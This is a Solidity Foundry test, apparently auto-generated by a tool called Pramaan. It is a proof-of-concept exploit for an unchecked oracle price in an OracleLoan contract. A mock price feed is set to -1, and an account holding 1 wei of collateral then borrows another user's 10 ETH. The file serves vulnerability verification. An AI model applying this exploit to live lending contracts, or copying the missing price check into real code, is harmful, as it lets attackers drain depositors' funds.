// SPDX-License-Identifier: UNLICENSED
// Generated by Pramaan for finding PRM-5: template oracle-unchecked-price@1, slots filled by heuristics.
// Hypothesis: OracleLoan.borrow(uint256) uses the price feed's answer without checking that it is positive, so a non-positive answer (cast to uint256) becomes an enormous price.
// Property under test: A feed that returns a non-positive answer must not let an account holding 1 wei of collateral take ETH that other users deposited.
// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).
pragma solidity >=0.8.0 <0.9.0;

import {Test} from "lib/pramaan-forge-std/src/Test.sol";
import {OracleLoan as PramaanTarget} from "src/OracleLoan.sol";

/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker
/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.
contract PramaanMockFeed {
    uint8 public constant decimals = 8;
    int256 public answer;
    uint256 public updatedAt;

    constructor(int256 initialAnswer) {
        answer = initialAnswer;
        updatedAt = block.timestamp;
    }

    function set(int256 newAnswer) external {
        answer = newAnswer;
        updatedAt = block.timestamp;
    }

    function latestAnswer() external view returns (int256) {
        return answer;
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, answer, updatedAt, updatedAt, 1);
    }
}

contract PramaanExploit_PRM_5 is Test {
    PramaanTarget internal target;
    PramaanMockFeed internal feed;
    address internal owner = makeAddr("pramaan.owner");
    address internal victim = makeAddr("pramaan.victim");
    address internal attacker = makeAddr("pramaan.attacker");
    uint256 internal constant SEED = 10 ether;
    uint256 internal constant ATTACK = 1 ether;

    function setUp() public {
        feed = new PramaanMockFeed(2000e8);
        vm.startPrank(owner);
        bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(address(feed)));
        address pramaanDeployed;
        assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }
        require(pramaanDeployed != address(0), "Pramaan: deployment failed");
        target = PramaanTarget(payable(pramaanDeployed));
        vm.stopPrank();
        vm.deal(victim, SEED);
        vm.prank(victim);
        target.deposit{value: SEED}();
    }

    function test_exploit() public {
        vm.deal(attacker, ATTACK);
        vm.prank(attacker);
        target.deposit{value: 1}();
        vm.prank(attacker);
        feed.set(-1);
        uint256 attackerBefore = attacker.balance;
        vm.prank(attacker);
        target.borrow(SEED);
        uint256 gained = attacker.balance - attackerBefore;
        emit log_named_uint("pramaan.attacker_gain", gained);
        assertGe(gained, SEED, "Pramaan: a non-positive oracle answer let an account with 1 wei of collateral take ETH other users deposited");
    }
}
